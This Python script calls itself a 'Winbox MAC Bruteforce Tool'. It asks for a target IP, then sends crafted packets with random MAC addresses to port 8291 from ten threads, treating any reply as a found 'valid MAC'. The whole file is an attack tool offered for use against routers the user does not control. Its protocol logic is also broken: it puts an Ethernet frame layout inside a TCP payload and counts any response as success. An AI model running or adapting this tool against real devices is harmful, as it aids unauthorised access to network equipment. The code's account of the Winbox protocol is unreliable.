#!/usr/bin/env python3
import socket
import struct
import binascii
import time
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style

# Initialize colorama
init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.GREEN}███████╗ █████╗ ████████╗██████╗ ██╗ ██████╗ ██████╗ 
{Fore.LIGHTGREEN_EX}██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██║██╔═══██╗╚════██╗
{Fore.GREEN}███████╗███████║   ██║   ██████╔╝██║██║   ██║ █████╔╝
{Fore.LIGHTGREEN_EX}╚════██║██╔══██║   ██║   ██╔══██╗██║██║   ██║██╔═══╝ 
{Fore.GREEN}███████║██║  ██║   ██║   ██║  ██║██║╚██████╔╝███████╗
{Fore.LIGHTGREEN_EX}╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝
{Fore.WHITE}══════════════════════════════════════════════════════
{Fore.GREEN}[+] Winbox MAC Bruteforce Tool
{Fore.LIGHTGREEN_EX}[+] Author: Satri0x
{Fore.GREEN}[+] Version: 1.0
{Fore.WHITE}══════════════════════════════════════════════════════
"""
    print(banner)

def loading_animation():
    animation = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(20):
        sys.stdout.write(f"\r{Fore.CYAN}[{animation[i % len(animation)]}] Loading... {Fore.WHITE}")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\n")

def validate_mac(mac):
    """Validate MAC address format"""
    try:
        mac_parts = mac.split(':')
        if len(mac_parts) != 6:
            return False
        for part in mac_parts:
            if not all(c in '0123456789abcdefABCDEF' for c in part):
                return False
            if len(part) != 2:
                return False
        return True
    except:
        return False

def parse_mac(mac_str):
    """Convert MAC string to bytes"""
    return [int(x, 16) for x in mac_str.split(':')]

def generate_mac():
    """Generate a random MAC address"""
    return [random.randint(0x00, 0xff) for _ in range(6)]

def format_mac(mac):
    """Format MAC address to string"""
    return ':'.join(['{:02x}'.format(x) for x in mac])

def create_winbox_packet(mac):
    """Create Winbox authentication packet"""
    packet = bytearray([
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Destination MAC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Source MAC
        0x88, 0xbe,                          # Ethertype
        0x01, 0x00,                          # Version
        0x00, 0x00,                          # Length
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Padding
    ])
    packet[6:12] = mac
    return packet

def try_mac(target_ip, mac):
    """Try to authenticate with given MAC address"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target_ip, 8291))
        
        packet = create_winbox_packet(mac)
        sock.send(packet)
        
        response = sock.recv(1024)
        if len(response) > 0:
            print(f"{Fore.GREEN}[+] Found valid MAC: {format_mac(mac)}{Fore.WHITE}")
            return True
    except:
        pass
    finally:
        sock.close()
    return False

def bruteforce(target_ip, start_mac=None, max_attempts=1000):
    """Main bruteforce function"""
    print(f"{Fore.YELLOW}[*] Starting Winbox MAC bruteforce against {target_ip}{Fore.WHITE}")
    print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Fore.WHITE}")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        for _ in range(max_attempts):
            if start_mac:
                mac = start_mac
                start_mac = None
            else:
                mac = generate_mac()
            executor.submit(try_mac, target_ip, mac)
            time.sleep(0.1)  # Prevent overwhelming the target

if __name__ == "__main__":
    clear_screen()
    print_banner()
    loading_animation()
    
    try:
        target_ip = input(f"{Fore.CYAN}[?] Enter target IP: {Fore.WHITE}")
        mac_input = input(f"{Fore.CYAN}[?] Enter starting MAC (optional, press Enter to skip): {Fore.WHITE}")
        
        if mac_input:
            if not validate_mac(mac_input):
                print(f"{Fore.RED}[-] Invalid MAC address format. Use format: XX:XX:XX:XX:XX:XX{Fore.WHITE}")
                sys.exit(1)
            start_mac = parse_mac(mac_input)
            bruteforce(target_ip, start_mac)
        else:
            bruteforce(target_ip)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Bruteforce stopped by user{Fore.WHITE}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Fore.WHITE}")
        sys.exit(1)
